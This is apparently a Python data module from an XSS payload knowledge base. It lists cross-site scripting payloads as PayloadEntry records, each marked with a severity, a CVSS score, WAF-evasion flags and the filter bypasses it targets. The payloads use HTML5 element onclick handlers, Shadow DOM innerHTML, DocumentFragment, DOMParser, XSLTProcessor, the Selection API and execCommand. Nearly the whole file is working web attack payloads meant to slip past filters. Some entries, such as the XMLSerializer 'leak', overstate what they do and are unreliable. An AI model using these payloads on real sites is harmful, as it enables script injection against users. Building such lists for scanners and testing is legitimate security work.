#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-27 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Absolute Final XSS Payloads - Part 3
HTML5 elements (part 3), Shadow DOM, Document Fragment, DOMParser, XMLSerializer, XSLTProcessor, and Selection API.
"""

from ..models import PayloadEntry


BRS_KB_ABSOLUTE_FINAL_PAYLOADS_PART3 = {
    "html5-section-element": PayloadEntry(
        payload='<section onclick="alert(1)">click</section>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML5 section element",
        tags=["html5", "section"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "html5-article-element": PayloadEntry(
        payload='<article onclick="alert(1)">click</article>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML5 article element",
        tags=["html5", "article"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "html5-aside-element": PayloadEntry(
        payload='<aside onclick="alert(1)">click</aside>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML5 aside element",
        tags=["html5", "aside"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "html5-header-element": PayloadEntry(
        payload='<header onclick="alert(1)">click</header>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML5 header element",
        tags=["html5", "header"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "html5-footer-element": PayloadEntry(
        payload='<footer onclick="alert(1)">click</footer>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML5 footer element",
        tags=["html5", "footer"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "html5-nav-element": PayloadEntry(
        payload='<nav onclick="alert(1)">click</nav>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML5 nav element",
        tags=["html5", "nav"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "html5-hgroup-element": PayloadEntry(
        payload='<hgroup onclick="alert(1)"><h1>x</h1></hgroup>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML5 hgroup element",
        tags=["html5", "hgroup"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "html5-search-element": PayloadEntry(
        payload='<search onclick="alert(1)">click</search>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="HTML5 search element (new)",
        tags=["html5", "search"],
        bypasses=["tag_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari"],
        reliability="high",
    ),
    # ============================================================
    # SHADOW DOM DEEP TRICKS
    # ============================================================
    "shadow-attachShadow": PayloadEntry(
        payload='<div id=x></div><script>x.attachShadow({mode:"open"}).innerHTML="<img src=x onerror=alert(1)>"</script>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="attachShadow innerHTML injection",
        tags=["shadow", "attachShadow"],
        bypasses=["shadow_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "shadow-closed": PayloadEntry(
        payload='<script>let s=document.body.attachShadow({mode:"closed"});s.innerHTML="<img src=x onerror=alert(1)>"</script>',
        contexts=["html_content"],
        severity="high",
        cvss_score=7.5,
        description="Closed shadow DOM injection",
        tags=["shadow", "closed"],
        bypasses=["shadow_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # DOCUMENT FRAGMENT TRICKS
    # ============================================================
    "fragment-append": PayloadEntry(
        payload="f=document.createDocumentFragment();f.appendChild(document.createElement('img')).onerror=alert;f.firstChild.src='x';document.body.appendChild(f)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="DocumentFragment injection",
        tags=["fragment", "append"],
        bypasses=["dom_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # DOMPARSER EDGE CASES
    # ============================================================
    "domparser-svg": PayloadEntry(
        payload='new DOMParser().parseFromString("<svg onload=alert(1)>","image/svg+xml")',
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="DOMParser SVG parsing",
        tags=["domparser", "svg"],
        bypasses=["parser_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    "domparser-xml": PayloadEntry(
        payload='new DOMParser().parseFromString("<x xmlns=\\"http://www.w3.org/1999/xhtml\\"><script>alert(1)</script></x>","application/xml")',
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="DOMParser XML with XHTML namespace",
        tags=["domparser", "xml"],
        bypasses=["parser_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # XMLSERIALIZER
    # ============================================================
    "xmlserializer-leak": PayloadEntry(
        payload="new XMLSerializer().serializeToString(document)",
        contexts=["javascript"],
        severity="medium",
        cvss_score=6.0,
        description="XMLSerializer document leak",
        tags=["xml", "serializer"],
        bypasses=["serializer_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # XSLTPROCESSOR
    # ============================================================
    "xslt-transform": PayloadEntry(
        payload="x=new XSLTProcessor();x.importStylesheet(new DOMParser().parseFromString(\"<xsl:stylesheet xmlns:xsl='http://www.w3.org/1999/XSL/Transform'><xsl:template match='/'><script>alert(1)</script></xsl:template></xsl:stylesheet>\",\"text/xml\"))",
        contexts=["javascript"],
        severity="critical",
        cvss_score=8.5,
        description="XSLTProcessor script injection",
        tags=["xslt", "transform"],
        bypasses=["xslt_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    # ============================================================
    # SELECTION API
    # ============================================================
    "selection-toString": PayloadEntry(
        payload="getSelection().toString()||alert(1)",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="Selection API with side effect",
        tags=["selection", "api"],
        bypasses=["selection_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="high",
    ),
    # ============================================================
    # EXECCOMMAND FULL LIST
    # ============================================================
    "execCommand-insertImage": PayloadEntry(
        payload="document.execCommand('insertImage',false,'x\" onerror=\"alert(1)')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="execCommand insertImage XSS",
        tags=["execCommand", "insertImage"],
        bypasses=["command_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
    "execCommand-createLink": PayloadEntry(
        payload="document.execCommand('createLink',false,'javascript:alert(1)')",
        contexts=["javascript"],
        severity="high",
        cvss_score=7.5,
        description="execCommand createLink XSS",
        tags=["execCommand", "createLink"],
        bypasses=["command_filters"],
        waf_evasion=True,
        browser_support=["chrome", "firefox", "safari", "edge"],
        reliability="medium",
    ),
}
